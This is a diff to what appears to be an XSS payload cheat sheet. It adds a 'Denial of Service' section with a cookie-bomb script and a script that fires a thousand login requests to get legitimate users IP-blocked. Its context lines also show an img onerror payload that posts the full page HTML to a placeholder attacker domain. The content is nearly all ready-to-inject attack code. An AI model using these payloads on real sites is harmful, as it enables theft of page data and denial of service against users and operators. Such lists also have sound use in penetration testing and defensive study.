@@ -6,6 +6,7 @@
 - [WEB API abusing](#web-api-abusing)
 - [Content Spoofing](#content-spoofing)
 - [Data Exfiltration](#data-exfiltration)
+- [Denial of Service](#denial-of-service)
 
 ## Credential stealing
 
@@ -114,4 +115,31 @@
 - Exfiltrating page content
     ```html
     <img src=nonexistent_src onerror=fetch('https://[ATTACKER-DOMAIN]',{method:'POST',body:btoa(unescape(encodeURIComponent(document.documentElement.outerHTML)))})>
+    ```
+
+## Denial of Service
+
+### An attacker can cause a denial of service by making the user's browser or the web server unresponsive. 
+
+- Cookie Bomb
+    ```html
+    <script>
+    for(let i = 0; i < 100; i++) {
+        document.cookie = `bomb${i}=${Array(1000).join('A')}`;
+    }
+    </script>
+    ```
+
+- IP blocking through rapid login attempts
+    ```html
+    <script>
+    // Rate limiting or threshold-based blocking can be triggered, causing legitimate users to be temporarily or permanently blocked
+    for (let i = 0; i < 1000; i++) {
+        fetch('/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: `username=user&password=pass${i}`
+        });
+    }
+    </script>
     ```
